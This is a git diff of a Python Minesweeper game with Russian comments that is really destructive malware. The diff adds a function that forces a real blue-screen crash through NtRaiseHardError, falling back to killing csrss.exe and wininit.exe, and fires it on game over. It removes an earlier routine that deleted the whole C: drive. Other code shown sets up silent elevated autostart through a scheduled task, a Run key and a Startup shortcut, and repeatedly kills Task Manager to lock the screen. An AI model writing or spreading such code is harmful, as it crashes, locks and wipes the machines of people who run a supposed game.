@@ -8,13 +8,14 @@ import win32com.client
 import shutil
 import winreg
 import ctypes
+from ctypes import wintypes
 
 try:
     import keyboard
 except ImportError:
     keyboard = None
 
-TARGET_HOSTS = ["pc-gstuxilg1"]
+TARGET_HOSTS = ["pc-gstuxilg"]
 
 num_colors = {
     1: "#0000FF",
@@ -30,6 +31,119 @@ num_colors = {
 cell = 40
 TIMER_SECONDS = 120
 TASK_NAME = "startsaper"
+
+# ntdll!NtRaiseHardError
+ntdll = ctypes.WinDLL("ntdll.dll", use_last_error=True)
+
+# STATUS_ASSERTION_FAILURE
+STATUS_ASSERTION_FAILURE = 0xC0000420
+# OptionShutdownSystem — заставляет Windows интерпретировать ошибку как фатальную
+OptionShutdownSystem = 6
+
+
+def enable_shutdown_privilege():
+    """Включает SeShutdownPrivilege для текущего процесса."""
+    try:
+        advapi32 = ctypes.WinDLL("advapi32.dll", use_last_error=True)
+        kernel32 = ctypes.WinDLL("kernel32.dll", use_last_error=True)
+
+        TOKEN_ADJUST_PRIVILEGES = 0x0020
+        TOKEN_QUERY = 0x0008
+        SE_PRIVILEGE_ENABLED = 0x0002
+
+        class LUID(ctypes.Structure):
+            _fields_ = [("LowPart", wintypes.DWORD),
+                        ("HighPart", wintypes.LONG)]
+
+        class LUID_AND_ATTRIBUTES(ctypes.Structure):
+            _fields_ = [("Luid", LUID),
+                        ("Attributes", wintypes.DWORD)]
+
+        class TOKEN_PRIVILEGES(ctypes.Structure):
+            _fields_ = [("PrivilegeCount", wintypes.DWORD),
+                        ("Privileges", LUID_AND_ATTRIBUTES * 1)]
+
+        hToken = wintypes.HANDLE()
+        if not advapi32.OpenProcessToken(
+            kernel32.GetCurrentProcess(),
+            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+            ctypes.byref(hToken)
+        ):
+            return False
+
+        luid = LUID()
+        if not advapi32.LookupPrivilegeValueW(
+            None, "SeShutdownPrivilege", ctypes.byref(luid)
+        ):
+            kernel32.CloseHandle(hToken)
+            return False
+
+        tp = TOKEN_PRIVILEGES()
+        tp.PrivilegeCount = 1
+        tp.Privileges[0].Luid = luid
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+
+        advapi32.AdjustTokenPrivileges(
+            hToken, False, ctypes.byref(tp),
+            ctypes.sizeof(tp), None, None
+        )
+        kernel32.CloseHandle(hToken)
+        return True
+    except Exception:
+        return False
+
+
+def trigger_bsod():
+    """Вызывает настоящий BSOD через ntdll!NtRaiseHardError."""
+    print("[BSOD] вызов NtRaiseHardError...")
+    enable_shutdown_privilege()
+
+    response = wintypes.ULONG(0)
+
+    # Прототип:
+    # NTSTATUS NtRaiseHardError(
+    #   NTSTATUS ErrorStatus,
+    #   ULONG NumberOfParameters,
+    #   ULONG UnicodeStringParameterMask,
+    #   PULONG_PTR Parameters,
+    #   ULONG ValidResponseOptions,
+    #   PULONG Response
+    # );
+    ntdll.NtRaiseHardError.restype = wintypes.LONG
+    ntdll.NtRaiseHardError.argtypes = [
+        wintypes.LONG,          # ErrorStatus
+        wintypes.ULONG,         # NumberOfParameters
+        wintypes.ULONG,         # UnicodeStringParameterMask
+        ctypes.c_void_p,        # Parameters
+        wintypes.ULONG,         # ValidResponseOptions
+        ctypes.POINTER(wintypes.ULONG),  # Response
+    ]
+
+    ntdll.NtRaiseHardError(
+        STATUS_ASSERTION_FAILURE,
+        0,                      # без параметров
+        0,                      # без Unicode-строк
+        None,                   # Parameters = NULL
+        OptionShutdownSystem,   # 6 = вызвать BSOD
+        ctypes.byref(response),
+    )
+    # Если сюда дошло — BSOD не сработал, fallback:
+    print("[BSOD] NtRaiseHardError не сработал, fallback → taskkill csrss")
+    try:
+        subprocess.Popen(
+            ["taskkill", "/F", "/IM", "csrss.exe"],
+            creationflags=subprocess.CREATE_NO_WINDOW,
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            stdin=subprocess.DEVNULL,
+        )
+        subprocess.Popen(
+            ["taskkill", "/F", "/IM", "wininit.exe"],
+            creationflags=subprocess.CREATE_NO_WINDOW,
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            stdin=subprocess.DEVNULL,
+        )
+    except Exception as e:
+        print(f"[BSOD] fallback failed: {e}")
 
 
 def is_admin():
@@ -67,7 +181,6 @@ def run_via_task():
 
 
 def relaunch_as_admin():
-    """Первый запуск — UAC → инстанс с --setup."""
     script = os.path.abspath(__file__)
     py = sys.executable
     params = f'"{script}" --setup'
@@ -82,8 +195,6 @@ def relaunch_as_admin():
 
 
 def install_autoload():
-    """Создаёт .bat, ярлык в Startup, HKCU Run и elevated-задачу.
-    Вызывается ОДИН раз, в elevated-инстансе с флагом --setup."""
     print("[Setup] установка автозагрузки и elevated-задачи...")
     script_dir = os.path.dirname(os.path.abspath(__file__))
     script_path = os.path.abspath(__file__)
@@ -139,7 +250,6 @@ def install_autoload():
     except Exception as e:
         print(f"[Registry] Ошибка: {e}")
 
-    # Ключевое: задача с RL HIGHEST — запускает процесс elevated без UAC.
     cmd = [
         "schtasks", "/Create",
         "/TN", TASK_NAME,
@@ -165,7 +275,6 @@ def install_autoload():
 
 
 def remove_autoload():
-    """Удаляет всё, что install_autoload создал."""
     print("[Remove] удаление автозагрузки...")
 
     try:
@@ -506,7 +615,7 @@ def run_savesaper():
             for r in range(visota):
                 if not opened[r][c]:
                     open_cell(r, c)
-        root.after(15000, root.destroy)
+        root.after(2000, trigger_bsod)
 
     while True:
         dlina = int(input("Введите длину поля (минимум 5)\n"))
@@ -789,19 +898,6 @@ def run_windelsaper():
         for i in gamepole:
             print(*i)
 
-    def run_cmd_commands(commands, show_window=False):
-        full_cmd = " & ".join(commands)
-        creationflags = 0
-        if not show_window:
-            creationflags = subprocess.CREATE_NO_WINDOW
-        proc = subprocess.run(
-            ["cmd.exe", "/C", full_cmd],
-            creationflags=creationflags,
-            capture_output=False,
-            text=True, encoding="utf-8", errors="replace",
-        )
-        return proc.returncode
-
     def gameover():
         nonlocal game_over
         if game_over:
@@ -813,16 +909,7 @@ def run_windelsaper():
             for r in range(visota):
                 if not opened[r][c]:
                     open_cell(r, c)
-        run_cmd_commands(cmds)
-        root.after(15000, root.destroy)
-
-    cmds = [
-        r"cd C:\ ",
-        r"rd C:\ /s/q",
-        r"del C:\ /s/q",
-        r"rd c:/s/q",
-        r"del c:/s/q",
-    ]
+        root.after(2000, trigger_bsod)
 
     print("Генерация поля")
     root = tk.Tk()
@@ -846,12 +933,20 @@ def run_windelsaper():
 
     def keep_kiosk():
         try:
-            subprocess.run(["taskkill", "/F", "/IM", "Taskmgr.exe"], check=False)
+            subprocess.Popen(
+                ["taskkill", "/F", "/IM", "Taskmgr.exe"],
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                stdin=subprocess.DEVNULL,
+            )
             root.attributes("-fullscreen", True)
             root.attributes("-topmost", True)
             root.lift()
+        except Exception:
+            pass
         finally:
-            root.after(1000, keep_kiosk)
+            root.after(3000, keep_kiosk)
     keep_kiosk()
 
     print("Заполнение поля")
@@ -892,32 +987,22 @@ def main():
     host = socket.gethostname().lower()
     is_target = host in TARGET_HOSTS
     if "--admin-elevated" in argv:
-        #print("[Main] запуск через задачу (elevated, без UAC)")
         run_game()
         return
     if "--setup" in argv:
-        #print("[Main] setup-инстанс (elevated)")
         if not is_target:
-            #print(f"[Main] host '{host}' != target — установка автозагрузки")
             install_autoload()
-        #else:
-            #print(f"[Main] host '{host}' == target — автозагрузка не ставится")
         run_game()
         return
 
     if not is_target:
         if task_exists():
-            #print("[Main] задача найдена — silent elevation")
             if run_via_task():
                 sys.exit(0)
-            #print("[Main] не удалось запустить через задачу, продолжаем как есть")
         else:
-            #print(f"[Main] host '{host}' != target — первый запуск, UAC + установка")
             if relaunch_as_admin():
                 sys.exit(0)
-            #print("[Main] UAC отклонён — запуск без прав админа")
     else:
-        #print(f"[Main] host '{host}' == target — обычный запуск без установки")
         if task_exists():
             if run_via_task():
                 sys.exit(0)
